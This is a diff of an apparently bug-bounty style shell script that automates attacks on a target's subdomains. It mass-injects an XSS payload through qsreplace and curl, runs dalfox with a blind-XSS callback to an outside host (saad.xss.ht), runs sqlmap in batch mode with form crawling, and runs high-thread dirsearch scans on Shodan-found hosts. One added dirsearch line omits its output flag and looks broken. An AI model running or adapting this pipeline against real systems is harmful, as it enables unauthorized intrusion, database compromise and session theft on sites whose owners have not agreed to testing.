@@ -70,7 +70,7 @@ cat $1/parameters.txt | gf xss | sed "s/'/ /g" | sed "s/(/ /g" | sed "s/)/ /g" |
 #------------------------------------------------#
 cat $1/xssPatterns.txt | qsreplace "\"><img src=x onerror=confirm(document.domain)>" | xargs -P 5000 -I % bash -c "curl -s -L '%' | grep \"<img src=x onerror=confirm(document.domain)>\" && echo -e \"[VULNERABLE] - % \n \"" 2> /dev/null | grep "VULNERABLE" | anew -q $1/xss.txt &> /dev/null
 #------------------------------------------------#
-dalfox file $1/xssPatterns.txt pipe --silence --no-color --no-spinner -w 300 -b saad.xss.ht 2> /dev/null | anew -q $1/xss.txt &> /dev/null
+dalfox file $1/xssPatterns.txt pipe --no-color --no-spinner -w 300 -b saad.xss.ht 2> /dev/null | anew -q $1/xss.txt &> /dev/null
 
 echo -e "BLINDER \n"
 
@@ -126,15 +126,13 @@ sqlmap -m $1/sqliPatterns.txt --batch --random-agent --level 1 --threads=5
 
 sqlmap -m $1-alive-subs.txt --batch --random-agent --level 1 --crawl=5 --forms --threads=5
 
-python3 dirsearch/dirsearch.py -l $1-alive-subs.txt -i 200 -t 300
+python3 dirsearch/dirsearch.py -l $1-alive-subs.txt -i 200 -t 300 $1/dirsearch.txt
 
 echo -e "SHODAN \n"
 
 shodan search ssl:"$1"  --fields ip_str,port --separator " " | awk '{print $1":"$2}' | httpx -silent -threads 300 -o $1test
 
-python3 jexboss/jexboss.py -mode file-scan -file $1test
-
-python3 dirsearch/dirsearch.py -l $1test -t 300
+python3 dirsearch/dirsearch.py -l $1test -t 300 -o $1/dirsearch0.txt
 
 sqlmap -m $1test --batch --random-agent --crawl=5 --forms --threads=5
 
